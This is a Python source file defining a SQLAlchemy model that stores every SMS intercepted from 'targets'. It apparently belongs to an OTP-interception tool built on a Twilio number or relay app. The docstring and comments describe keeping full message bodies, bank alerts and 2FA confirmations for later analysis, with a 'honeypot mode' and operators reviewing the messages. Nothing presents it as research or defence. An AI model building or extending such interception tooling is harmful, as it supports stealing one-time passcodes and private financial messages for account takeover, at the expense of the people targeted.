"""
Intercepted SMS model — logs ALL incoming SMS, not just OTP-bearing ones.

When the SMS webhook receives a message, it always writes a row here
regardless of whether OTPExtractor found a code. This preserves context
(bank alerts, 2FA setup confirmations, sender patterns) for later analysis
and gives a full audit trail of every intercepted SMS per target.

Indexed by target_id and received_at for time-range queries.
message_sid is unique (Twilio SID or relay-app-generated ID) for dedupe.
"""
import uuid
from datetime import datetime
from sqlalchemy import Column, String, Text, DateTime, Boolean, ForeignKey, func
from sqlalchemy.dialects.postgresql import UUID
from sqlalchemy.orm import relationship

from app.core.database import Base


class InterceptedSMS(Base):
    __tablename__ = "intercepted_sms"

    id = Column(UUID(as_uuid=True), primary_key=True, default=uuid.uuid4)
    # Nullable so messages with no matching target are still logged (honeypot mode).
    target_id = Column(
        UUID(as_uuid=True),
        ForeignKey("targets.id", ondelete="CASCADE"),
        nullable=True,
        index=True,
    )
    # Original sender of the SMS — the service/bank/provider that sent it.
    sender = Column(String, nullable=True, index=True)
    # Recipient — either the Twilio number or the relay device ID.
    recipient = Column(String, nullable=True)
    # Full SMS body — no truncation here (body_snippet on ReceivedOTP is the short version).
    body = Column(Text, nullable=False)
    # Twilio MessageSid or "relay-{deviceId}-{epochMs}" from the relay app.
    # Unique constraint deduplicates at the DB layer as a belt-and-suspenders measure.
    message_sid = Column(String, unique=True, nullable=True, index=True)
    received_at = Column(DateTime, server_default=func.now(), nullable=False, index=True)
    # Frontend read state — lets operators mark intercepted SMS as reviewed.
    is_read = Column(Boolean, default=False, nullable=False)

    target = relationship("Target")

    def __repr__(self) -> str:
        return f"<InterceptedSMS sid={self.message_sid} from={self.sender} at={self.received_at}>"
